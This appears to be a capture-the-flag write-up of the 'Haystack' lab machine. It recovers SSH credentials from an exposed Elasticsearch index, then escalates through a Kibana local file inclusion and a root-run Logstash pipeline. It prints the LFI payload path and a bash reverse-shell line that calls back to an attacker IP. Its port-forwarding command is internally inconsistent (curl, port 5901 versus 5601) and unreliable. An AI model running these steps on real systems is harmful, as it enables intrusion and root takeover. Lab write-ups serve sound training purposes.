# Summary
- User: hint hidden at the end of an image file and an exposed Elasticsearch instance that contains two entries (related to the hint from the image) with a username and password used for SSH login
- Root: LFI exploit in Kibana web interface that makes it possible to execute a JavaScript script and gain access as the Kibana user which permits writing a command to a file which will match against a Logstash search and be executed by the root user

# Details
### User: 04d18bc79dac1d4d48ee0a940c8eb929
- Nmap scan reveals ports 22, 80, and 9200 open, with an HTTP server listening on 9200
- the website displays only a single image of a needle
- downloading the image and running `strings` on it reveals a base64 encoded string at the end ('bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==')
- when decoded, the string reads `la aguja en el pajar es "clave"` and when translated to English `the needle in the haystack is "key"`
- making a request to the service on port 9200 reveals it's an Elasticsearch instance
- Elasticsearch indices can be retrieved with `http://haystack.htb:9200/_cat/indices`, revealing two interesting indices names `quotes` and `bank`
- searching the `quotes` index for the word `clave` in the `quote` field with `curl haystack.htb:9200/quotes/_search -H 'Content-Type: application/json' -d '{"query": {"match": {"quote": "clave" }}}' | python -m json.tool` reveals two results that each contain a base64 encoded string
- decoding each string (`dXNlcjogc2VjdXJpdHkg`, `cGFzczogc3BhbmlzaC5pcy5rZXk=`) reveals `user: security` and `pass: spanish.is.key` which can be used to login over SSH

### Root: 3f5f727c38d9f70e1d2ad2ba11059d92
- enumerating reveals the server is also listening for local connections on port 5601, which is used by Kibana
- port forwarding port 5901 on the target box with `curl -L 5901:localhost:5901 security@haystack.htb` makes it possible to interact with the Kibana admin panel
- the Kibana web interface reveals it's version 6.4.2 and is vulnerable to a local file inclusion vulnerabiltiy which can lead to code execution
- this makes it possible to put a reverse Node shell on the server and then trigger it with `localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../path/to/shell.js`
- any time the shell disconnects, a different filename needs to be used for the reverse shell in order to reconnect
- shell access as the `kibana` user makes it possible to match against Logstash configuration files inside `/etc/logstash/conf.d` by writing files to `/opt/kibana`
	- the Logstash service is being run by the `root` user
	- can be found by searching for files owned by the `kibana` group with `find / -type f -group kibana 2>/dev/null`
- schedule execution of a bash reverse shell by writing `Ejecutar comando: bash -i >& /dev/tcp/10.10.14.41/9406 0>&1` to a file under the `/opt/kibana` directory with the filename beginning with `logstash_`

### References:
- https://github.com/mpgn/CVE-2018-17246
- https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
